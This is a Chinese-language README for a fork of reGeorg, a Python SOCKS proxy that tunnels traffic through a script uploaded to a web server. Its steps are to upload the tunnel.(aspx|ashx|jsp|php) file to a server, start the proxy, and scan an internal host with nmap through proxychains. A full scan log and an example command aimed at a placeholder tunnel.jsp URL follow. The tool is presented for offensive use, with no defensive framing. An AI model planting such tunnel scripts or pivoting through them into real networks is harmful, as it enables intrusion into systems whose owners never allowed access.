w_reGeorg
=========
fork_reGeorg对原regeorg进行了修改

版本
----

1.0

描述
-----------

w_reGeorg 运行于python2.7环境:

* [requests] -  依赖requests包，需要先通过pip install requests进行安装
 

使用方法
--------------

```
$ reGeorgSocksProxy.py [-h] [-l] [-p] [-r] -u  [-v]

Socks server for reGeorg HTTP(s) tunneller

optional arguments:
  -h, --help           show this help message and exit
  -l , --listen-on     The default listening address
  -p , --listen-port   The default listening port
  -r , --read-buff     Local read buffer, max data to be sent per POST
  -u , --url           The url containing the tunnel script
  -v , --verbose       Verbose output[INFO|DEBUG]

```

* **Step 1.**
上传 tunnel.(aspx|ashx|jsp|php) 到web服务器 

* **Step 2.**
启动reGeorg工具
配置proxychains(linux)或Proxifier(windows)代理工具流量到目标网络

* **Step 3.** 干！ :)
```shell script
freedom@freedom-virtual-machine:~/reGeorg$ sudo proxychains nmap -Pn -sT 192.168.2.1 -p 1-30
ProxyChains-3.1 (http://proxychains.sf.net)

Starting Nmap 7.60 ( https://nmap.org ) at 2021-02-18 16:57 CST
|S-chain|-<>-127.0.0.1:8889-<><>-192.168.2.1:22-<><>-OK
|S-chain|-<>-127.0.0.1:8889-<><>-192.168.2.1:21-<--timeout
|S-chain|-<>-127.0.0.1:8889-<><>-192.168.2.1:25-<--timeout
|S-chain|-<>-127.0.0.1:8889-<><>-192.168.2.1:23-<--timeout
|S-chain|-<>-127.0.0.1:8889-<><>-192.168.2.1:12-<--timeout
|S-chain|-<>-127.0.0.1:8889-<><>-192.168.2.1:29-<--timeout
|S-chain|-<>-127.0.0.1:8889-<><>-192.168.2.1:13-<--timeout
|S-chain|-<>-127.0.0.1:8889-<><>-192.168.2.1:18-<--timeout
|S-chain|-<>-127.0.0.1:8889-<><>-192.168.2.1:17-<--timeout
|S-chain|-<>-127.0.0.1:8889-<><>-192.168.2.1:30-<--timeout
|S-chain|-<>-127.0.0.1:8889-<><>-192.168.2.1:11-<--timeout
|S-chain|-<>-127.0.0.1:8889-<><>-192.168.2.1:15-<--timeout
|S-chain|-<>-127.0.0.1:8889-<><>-192.168.2.1:28-<--timeout
|S-chain|-<>-127.0.0.1:8889-<><>-192.168.2.1:27-<--timeout
|S-chain|-<>-127.0.0.1:8889-<><>-192.168.2.1:5-<--timeout
|S-chain|-<>-127.0.0.1:8889-<><>-192.168.2.1:9-<--timeout
|S-chain|-<>-127.0.0.1:8889-<><>-192.168.2.1:20-<--timeout
|S-chain|-<>-127.0.0.1:8889-<><>-192.168.2.1:16-<--timeout
|S-chain|-<>-127.0.0.1:8889-<><>-192.168.2.1:19-<><>-OK
|S-chain|-<>-127.0.0.1:8889-<><>-192.168.2.1:2-<--timeout
|S-chain|-<>-127.0.0.1:8889-<><>-192.168.2.1:4-<--timeout
|S-chain|-<>-127.0.0.1:8889-<><>-192.168.2.1:6-<--timeout
|S-chain|-<>-127.0.0.1:8889-<><>-192.168.2.1:14-<--timeout
|S-chain|-<>-127.0.0.1:8889-<><>-192.168.2.1:3-<--timeout
|S-chain|-<>-127.0.0.1:8889-<><>-192.168.2.1:1-<--timeout
|S-chain|-<>-127.0.0.1:8889-<><>-192.168.2.1:10-<--timeout
|S-chain|-<>-127.0.0.1:8889-<><>-192.168.2.1:7-<--timeout
|S-chain|-<>-127.0.0.1:8889-<><>-192.168.2.1:26-<--timeout
|S-chain|-<>-127.0.0.1:8889-<><>-192.168.2.1:24-<--timeout
|S-chain|-<>-127.0.0.1:8889-<><>-192.168.2.1:8-<--timeout
Nmap scan report for 192.168.2.1
Host is up (0.96s latency).
Not shown: 28 closed ports
PORT   STATE SERVICE
19/tcp open  chargen
22/tcp open  ssh

Nmap done: 1 IP address (1 host up) scanned in 28.48 seconds
```


Example
---------
```
$ python reGeorgSocksProxy.py -p 8080 -u http://xxx.xxx.xxx:8080/tunnel/tunnel.jsp
```
